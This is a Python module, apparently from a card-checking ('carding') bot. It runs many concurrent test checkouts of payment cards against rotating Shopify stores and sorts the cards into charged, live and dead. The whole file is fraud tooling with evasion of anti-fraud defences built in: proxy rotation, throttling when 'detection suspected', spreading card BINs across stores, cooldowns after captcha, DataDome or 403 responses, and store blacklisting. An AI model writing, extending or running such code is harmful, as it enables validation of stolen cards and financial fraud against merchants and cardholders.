"""Mass check engine — async worker pool, progress tracking, store rotation.

Runs N concurrent workers (tier-limited), checks cards against random stores,
reports progress every 3 seconds via callback.
Supports state persistence for resume after crash.
Adaptive concurrency: scales workers up/down based on success ratio.
"""

import asyncio
import random
import time
import json
import logging
import sqlite3
import math
from collections import deque, defaultdict
from dataclasses import dataclass, field
from typing import Callable, Awaitable
from urllib.parse import urlparse

from core.card_parser import Card
from core.checker import shopify_check, CheckResult
from core.loader import pick_store
from core.store_health import StoreHealthCache, _record_check_internal

logger = logging.getLogger(__name__)


@dataclass
class MassCheckResult:
    charged: list[tuple[Card, CheckResult]] = field(default_factory=list)
    live: list[tuple[Card, CheckResult]] = field(default_factory=list)
    dead: list[tuple[Card, CheckResult]] = field(default_factory=list)
    total: int = 0
    checked: int = 0
    duration: float = 0.0


class AdaptiveSemaphore:
    """Dynamic concurrency controller that scales workers based on success ratio.
    
    Monitors last N results. If success ratio drops below threshold,
    halves concurrency. If ratio recovers, scales back up.
    """

    def __init__(self, max_workers: int, window: int = 50, low_threshold: float = 0.20, high_threshold: float = 0.40):
        self._max = max_workers
        self._floor = max(3, max_workers // 4)
        self._current = max_workers
        self._semaphore = asyncio.Semaphore(max_workers)
        self._window = deque(maxlen=window)
        self._low = low_threshold
        self._high = high_threshold
        self._last_adjust = 0.0
        self._lock = asyncio.Lock()

    async def acquire(self):
        await self._semaphore.acquire()

    def release(self):
        self._semaphore.release()

    async def record(self, success: bool):
        self._window.append(success)
        if len(self._window) < 10:
            return
            
        now = time.time()
        if now - self._last_adjust < 5.0:
            return
            
        async with self._lock:
            self._last_adjust = now
            ratio = sum(self._window) / len(self._window)
            old = self._current

            if ratio < self._low and self._current > self._floor:
                # Detection suspected — halve concurrency
                self._current = max(self._floor, self._current // 2)
                logger.info("Adaptive: success ratio %.0f%% — scaling DOWN %d -> %d workers", ratio * 100, old, self._current)
            elif ratio > self._high and self._current < self._max:
                # Recovery — scale back up
                self._current = min(self._max, self._current + max(1, (self._max - self._current) // 3))
                logger.info("Adaptive: success ratio %.0f%% — scaling UP %d -> %d workers", ratio * 100, old, self._current)

            if self._current != old:
                # Adjust semaphore capacity in-place (don't replace the object)
                diff = self._current - old
                if diff > 0:
                    # Scale up: release extra slots
                    for _ in range(diff):
                        self._semaphore.release()
                elif diff < 0:
                    # Scale down: acquire slots (non-blocking best-effort)
                    for _ in range(-diff):
                        try:
                            self._semaphore._value = max(0, self._semaphore._value - 1)
                        except Exception:
                            break

    @property
    def current_workers(self) -> int:
        return self._current


class MassCheckState:
    """State machine for tracking mass check progress in SQLite."""
    
    @staticmethod
    def create(conn: sqlite3.Connection, user_id: int, chat_id: int,
               cards: list[Card], stores: list[str], price_range: str,
               checked: int, message_id: int = None) -> int:
        try:
            cards_json = json.dumps([c.raw for c in cards])
            stores_json = json.dumps(stores)
            cursor = conn.execute(
                """INSERT INTO mass_check_state
                   (user_id, chat_id, message_id, cards_total, cards_checked,
                    cards_json, stores_json, price_range, status)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running')""",
                (user_id, chat_id, message_id, len(cards), checked,
                 cards_json, stores_json, price_range),
            )
            conn.commit()
            return cursor.lastrowid
        except Exception as e:
            logger.warning("Failed to save mass check state: %s", e)
            return None

    @staticmethod
    def update(conn: sqlite3.Connection, state_id: int, checked: int):
        if not state_id: return
        try:
            conn.execute("UPDATE mass_check_state SET cards_checked = ? WHERE id = ?", (checked, state_id))
            conn.commit()
        except Exception:
            pass

    @staticmethod
    def complete(conn: sqlite3.Connection, state_id: int):
        if not state_id: return
        try:
            conn.execute("UPDATE mass_check_state SET status = 'complete' WHERE id = ?", (state_id,))
            conn.commit()
        except Exception:
            pass

# Backward compatibility wrappers
def save_state(*args, **kwargs): return MassCheckState.create(*args, **kwargs)
def update_state(*args, **kwargs): return MassCheckState.update(*args, **kwargs)
def complete_state(*args, **kwargs): return MassCheckState.complete(*args, **kwargs)


def get_pending_state(conn: sqlite3.Connection, user_id: int) -> sqlite3.Row | None:
    """Get any incomplete mass check state for a user."""
    return conn.execute(
        "SELECT * FROM mass_check_state WHERE user_id = ? AND status = 'running' ORDER BY started_at DESC LIMIT 1",
        (user_id,),
    ).fetchone()


def clear_state(conn: sqlite3.Connection, state_id: int):
    """Delete a mass check state."""
    conn.execute("DELETE FROM mass_check_state WHERE id = ?", (state_id,))
    conn.commit()


async def mass_check(
    cards: list[Card],
    stores: list[str],
    workers: int,
    timeout: int = 120,
    progress_callback: Callable[[int, int, MassCheckResult, float], Awaitable[None]] = None,
    progress_interval: float = 3.0,
    proxy_provider: Callable[[], Awaitable[str]] = None,
    state_conn: sqlite3.Connection = None,
    state_id: int = None,
    health_cache: StoreHealthCache = None,
) -> MassCheckResult:
    """Run mass check on a list of cards.

    Args:
        cards: List of Card objects to check
        stores: List of Shopify store URLs
        workers: Max concurrent workers (tier-limited)
        timeout: Per-request timeout in seconds
        progress_callback: Async callback(checked, total, result, elapsed)
        progress_interval: Seconds between progress updates
        proxy_provider: Async callable returning a proxy URL, or None
        state_conn: Optional SQLite conn for state persistence
        state_id: Optional state row ID for progress updates
        health_cache: Optional store health cache for scoring
    Returns:
        MassCheckResult with charged/live/dead lists
    """
    total = len(cards)
    result = MassCheckResult(total=total)
    adaptive_sem = AdaptiveSemaphore(workers)
    used_stores: set[str] = set()
    max_used_cache = 500
    start_time = time.time()
    last_progress = 0.0
    last_state_save = 0.0
    health_batch = []
    lock = asyncio.Lock()
    
    # Store-IP Cooldown Tracker
    store_cooldowns = {}

    # Per-domain concurrency cap: max 2 concurrent checks per root domain
    _DOMAIN_CAP = 2
    domain_counters: dict[str, int] = defaultdict(int)
    domain_lock = asyncio.Lock()

    def _extract_domain(url: str) -> str:
        """Extract root domain from store URL for concurrency grouping."""
        try:
            host = urlparse(url).hostname or url
            parts = host.split(".")
            # e.g. shop.example.com -> example.com
            if len(parts) > 2:
                return ".".join(parts[-2:])
            return host
        except Exception:
            return url

    async def _acquire_domain(store: str) -> bool:
        """Try to acquire a domain slot. Returns True if acquired."""
        domain = _extract_domain(store)
        async with domain_lock:
            if domain_counters[domain] < _DOMAIN_CAP:
                domain_counters[domain] += 1
                return True
            return False

    async def _release_domain(store: str):
        """Release a domain slot."""
        domain = _extract_domain(store)
        async with domain_lock:
            domain_counters[domain] = max(0, domain_counters[domain] - 1)

    # ── Step 4: Progressive Timing ──────────────────────────────────
    # Track last-use timestamp per store; add escalating jitter on rapid reuse
    store_last_use: dict[str, float] = {}       # url -> last use timestamp
    store_rapid_count: dict[str, int] = {}      # url -> consecutive rapid-reuse count
    _RAPID_WINDOW = 8.0                         # seconds — reuse within this = "rapid"
    _BASE_DELAY = 1.5                           # seconds — base progressive delay
    _MAX_DELAY = 8.0                            # seconds — cap on progressive delay

    # ── Step 5: Card BIN Spread ───────────────────────────────────
    # Avoid sending cards with the same BIN to the same store back-to-back
    bin_last_store: dict[str, str] = {}         # BIN (first 6) -> last store used
    bin_last_time: dict[str, float] = {}        # BIN -> timestamp of last use
    _BIN_SPREAD_TTL = 30.0                      # seconds — BIN-store mapping expires

    # ── Step 6: Store Auto-Blacklist ──────────────────────────────
    # Permanently blacklist stores with consecutive failure streaks
    store_fail_streak: dict[str, int] = defaultdict(int)  # url -> consecutive failures
    _BLACKLIST_THRESHOLD = 5                    # consecutive failures to trigger blacklist
    blacklisted: set[str] = set()               # blacklisted for this session

    # Sort stores by health score if cache available
    if health_cache:
        stores = health_cache.get_ranked(stores)

    def _pick_store_smart(exclude: set = None, card_bin: str = "") -> str | None:
        """Pick a store using weighted health scores + cooldown + domain cap check.
        
        Excludes blacklisted stores and (optionally) the last store used for this BIN.
        Falls back to random pick_store() if no health cache.
        """
        skip = set(exclude or set())
        # Step 6: exclude blacklisted
        skip.update(blacklisted)
        # Step 5: exclude last store used for this BIN (if still fresh)
        if card_bin and card_bin in bin_last_store:
            if time.time() - bin_last_time.get(card_bin, 0) < _BIN_SPREAD_TTL:
                skip.add(bin_last_store[card_bin])

        if health_cache:
            now = time.time()
            for s, until in store_cooldowns.items():
                if until > now:
                    skip.add(s)
            picked = health_cache.get_weighted(stores, exclude=skip)
            if picked:
                return picked
        # Fallback: filter blacklisted from available list, then random pick
        available = [s for s in stores if s not in skip]
        if not available:
            available = [s for s in stores if s not in blacklisted]
        return pick_store(available, used_stores) if available else pick_store(stores, used_stores)

    async def check_one(card: Card):
        nonlocal last_progress, last_state_save
        await adaptive_sem.acquire()
        store = None
        try:
            c_bin = card.bin  # first 6 digits

            # Pick a store with weighted selection + domain cap + BIN spread
            for _ in range(15):
                candidate = _pick_store_smart(exclude=used_stores, card_bin=c_bin)
                if not candidate:
                    break
                # Check cooldown
                if candidate in store_cooldowns and time.time() < store_cooldowns[candidate]:
                    used_stores.add(candidate)
                    continue
                # Check domain cap
                if await _acquire_domain(candidate):
                    store = candidate
                    break
                # Domain full, try another
                used_stores.add(candidate)
                
            if len(used_stores) > max_used_cache:
                # Remove random half instead of full clear to avoid re-use bursts
                import random
                to_remove = random.sample(list(used_stores), max_used_cache // 2)
                for s in to_remove:
                    used_stores.discard(s)
            if not store:
                # All domain slots full or no stores — force pick ignoring domain cap
                candidate = _pick_store_smart()
                if candidate:
                    await _acquire_domain(candidate)  # best effort
                    store = candidate
                
            if not store:
                async with lock:
                    result.dead.append((card, CheckResult(
                        status="DEAD", message="no_stores_available",
                        gateway="Shopify Payments", price=0.0, store="", card=card,
                    )))
                    result.checked += 1
                return

            # ── Step 4: Progressive Timing ────────────────────────
            # If this store was used recently, add an escalating delay
            now_pt = time.time()
            last_use = store_last_use.get(store, 0)
            gap = now_pt - last_use
            if gap < _RAPID_WINDOW:
                rapid = store_rapid_count.get(store, 0) + 1
                store_rapid_count[store] = rapid
                delay = min(_MAX_DELAY, _BASE_DELAY * rapid)
                logger.debug("Progressive delay %.1fs on %s (rapid reuse #%d)", delay, store, rapid)
                await asyncio.sleep(delay)
            else:
                store_rapid_count[store] = 0
            store_last_use[store] = time.time()

            # ── Step 5: Record BIN→store mapping ──────────────────
            bin_last_store[c_bin] = store
            bin_last_time[c_bin] = time.time()

            proxy = None
            if proxy_provider:
                try:
                    proxy = await proxy_provider()
                except Exception:
                    proxy = None

            check_result = None
            max_store_retries = 2
            
            for attempt in range(max_store_retries):
                check_result = await shopify_check(card, store, proxy=proxy, timeout=timeout, max_retries=0)
                is_network_error = (
                    check_result.status == "SITE_ERROR"
                    or any(kw in check_result.message for kw in ("timeout", "dns_error", "proxy_error", "ssl_error", "connection_error", "session_init_failed", "no_products_found", "cart_failed", "checkout_start_failed", "token_extraction_failed", "site_error", "failed_to_fetch", "unknown_error", "HTTP 4", "HTTP 5", "api_http_error", "api_error"))
                )
                
                # Detect captcha/checkpoint for health scoring
                is_captcha = any(kw in check_result.message for kw in ("captcha", "checkpoint", "datadome"))
                is_403 = "403" in check_result.message
                
                if is_network_error or is_captcha or is_403:
                    # Impose a 15-second global cooldown on this store
                    store_cooldowns[store] = time.time() + 15.0

                if is_network_error and attempt < max_store_retries - 1:
                    # Update health for the failed store with result_type
                    if health_cache:
                        rtype = "captcha" if is_captcha else ("403" if is_403 else "")
                        health_cache.update_score(store, False, result_type=rtype)
                    
                    # Release domain slot for old store
                    await _release_domain(store)
                        
                    # Pick a new store and proxy
                    new_store = None
                    for _ in range(10):
                        candidate = _pick_store_smart(exclude=used_stores)
                        if not candidate:
                            break
                        if candidate in store_cooldowns and time.time() < store_cooldowns[candidate]:
                            used_stores.add(candidate)
                            continue
                        if await _acquire_domain(candidate):
                            new_store = candidate
                            break
                        used_stores.add(candidate)
                    
                    if new_store:
                        store = new_store
                    else:
                        # Fallback: reuse a random store
                        fallback = _pick_store_smart()
                        if fallback:
                            await _acquire_domain(fallback)
                            store = fallback
                            
                    if proxy_provider:
                        try:
                            proxy = await proxy_provider()
                        except Exception:
                            proxy = None
                    await asyncio.sleep(1)
                    continue
                break

            # Determine result_type for health scoring
            result_type = ""
            if check_result.status == "CHARGED":
                result_type = "CHARGED"
            elif any(kw in check_result.message for kw in ("captcha", "checkpoint", "datadome")):
                result_type = "captcha"
            elif "403" in check_result.message:
                result_type = "403"

            # Update store health (memory + DB batched)
            success = check_result.status in ("CHARGED", "LIVE", "LIVE_3DS")
            await adaptive_sem.record(success)
            
            if health_cache:
                health_cache.update_score(store, success, result_type=result_type)
                if state_conn or (health_cache and health_cache.conn):
                    db_conn = state_conn or health_cache.conn
                    try:
                        _record_check_internal(db_conn, store, success, 0)
                    except Exception:
                        pass

            # ── Step 6: Store Auto-Blacklist ───────────────────────
            # Track consecutive failures per store; blacklist at threshold
            if success:
                store_fail_streak[store] = 0
            else:
                store_fail_streak[store] += 1
                if store_fail_streak[store] >= _BLACKLIST_THRESHOLD:
                    if store not in blacklisted:
                        blacklisted.add(store)
                        logger.warning(
                            "Auto-blacklisted store %s after %d consecutive failures",
                            store, store_fail_streak[store],
                        )

            async with lock:
                if check_result.status == "CHARGED":
                    result.charged.append((card, check_result))
                elif check_result.status.startswith("LIVE"):
                    result.live.append((card, check_result))
                else:
                    result.dead.append((card, check_result))

                result.checked += 1
                checked = result.checked

            # Progress callback
            now = time.time()
            if progress_callback and (now - last_progress) >= progress_interval:
                last_progress = now
                elapsed = now - start_time
                try:
                    await progress_callback(checked, total, result, elapsed)
                except Exception as e:
                    logger.warning("Progress callback error: %s", e)

            # Save state + batch commit health every 5 seconds
            if state_conn and state_id and (now - last_state_save) >= 5.0:
                last_state_save = now
                update_state(state_conn, state_id, checked)
                try:
                    state_conn.commit()
                except Exception:
                    pass
        finally:
            if store:
                await _release_domain(store)
            adaptive_sem.release()

    # Process cards in batches to avoid creating 50k+ tasks at once
    _BATCH_SIZE = 200
    for batch_start in range(0, len(cards), _BATCH_SIZE):
        batch = cards[batch_start:batch_start + _BATCH_SIZE]
        tasks = [asyncio.create_task(check_one(c)) for c in batch]
        await asyncio.gather(*tasks, return_exceptions=True)

    result.duration = time.time() - start_time

    # Final progress update
    if progress_callback:
        try:
            await progress_callback(result.checked, total, result, result.duration)
        except Exception:
            pass

    # Mark state complete
    if state_conn and state_id:
        complete_state(state_conn, state_id)

    logger.info(
        "Mass check complete: total=%d charged=%d live=%d dead=%d duration=%.1fs",
        total, len(result.charged), len(result.live), len(result.dead), result.duration,
    )
    return result


def format_duration(seconds: float) -> str:
    """Format seconds as 'Xh Ym Zs'."""
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    if h > 0:
        return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"